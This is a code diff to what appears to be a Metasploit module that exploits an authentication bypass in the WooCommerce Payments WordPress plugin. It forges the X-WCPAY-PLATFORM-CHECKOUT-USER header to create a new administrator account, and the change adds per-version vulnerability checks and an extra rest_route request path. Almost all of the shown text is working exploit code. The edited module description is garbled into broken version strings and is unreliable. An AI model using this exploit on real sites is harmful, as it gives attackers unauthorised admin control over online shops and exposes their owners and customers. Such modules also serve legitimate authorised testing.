@@ -14,9 +14,9 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation',
         'Description' => %q{
-          WooCommerce-Payments plugin for Wordpress versions 4.8 prior to 4.8.2, 4.9 prior to 4.9.1,
-          5.0 prior to 5.0.4, 5.1 prior to 5.1.3, 5.2 prior to 5.2.2, 5.3 prior to 5.3.1, 5.4 prior to 5.4.1,
-          5.5 prior to 5.5.2, and 5.6 prior to 5.6.2 contain an authentication bypass by specifying a valid user ID number
+          WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,
+          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,
+          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number
           within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API
           to create a new user with administrative privileges on the target WordPress site IF the user ID
           selected corresponds to an administrator account.
@@ -57,12 +57,28 @@ class MetasploitModule < Msf::Auxiliary
       return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
     end
 
-    checkcode = check_plugin_version_from_readme('woocommerce-payments', '5.6.2')
-    if checkcode == Msf::Exploit::CheckCode::Safe
-      return Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable')
+    vuln_versions = [
+      ['4.8', '4.8.2'],
+      ['4.9', '4.9.1'],
+      ['5.0', '5.0.4'],
+      ['5.1', '5.1.3'],
+      ['5.2', '5.2.2'],
+      ['5.3', '5.3.1'],
+      ['5.4', '5.4.1'],
+      ['5.5', '5.5.2'],
+      ['5.6', '5.6.2']
+    ]
+
+    vuln_versions.each do |versions|
+      introduced = versions[0]
+      fixed = versions[1]
+      checkcode = check_plugin_version_from_readme('woocommerce-payments', fixed, introduced)
+      if checkcode == Exploit::CheckCode::Appears
+        return Msf::Exploit::CheckCode::Appears('WooCommerce-Payments version is exploitable')
+      end
     end
 
-    checkcode
+    Msf::Exploit::CheckCode::Safe('WooCommerce-Payments version not vulnerable or plugin not installed')
   end
 
   def run
@@ -82,19 +98,35 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status("Attempting to create an administrator user -> #{username}:#{password} (#{email})")
-    ['/', 'index.php'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
-      res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
-        'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
-        'method' => 'POST',
-        'ctype' => 'application/json',
-        'data' => {
-          'username' => username,
-          'email' => email,
-          'password' => password,
-          'roles' => ['administrator']
-        }.to_json
-      })
+    ['/', 'index.php', '/rest'].each do |url_root| # try through both '' and 'index.php' since API can be in 2 diff places based on install/rewrites
+      if url_root == '/rest'
+        res = send_request_cgi({
+          'uri' => normalize_uri(target_uri.path),
+          'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
+          'method' => 'POST',
+          'ctype' => 'application/json',
+          'vars_get' => { 'rest_route' => 'wp-json/wp/v2/users' },
+          'data' => {
+            'username' => username,
+            'email' => email,
+            'password' => password,
+            'roles' => ['administrator']
+          }.to_json
+        })
+      else
+        res = send_request_cgi({
+          'uri' => normalize_uri(target_uri.path, url_root, 'wp-json', 'wp', 'v2', 'users'),
+          'headers' => { "X-WCPAY-PLATFORM-CHECKOUT-USER": datastore['ADMINID'] },
+          'method' => 'POST',
+          'ctype' => 'application/json',
+          'data' => {
+            'username' => username,
+            'email' => email,
+            'password' => password,
+            'roles' => ['administrator']
+          }.to_json
+        })
+      end
       fail_with(Failure::Unreachable, 'Connection failed') unless res
       next if res.code == 404
 
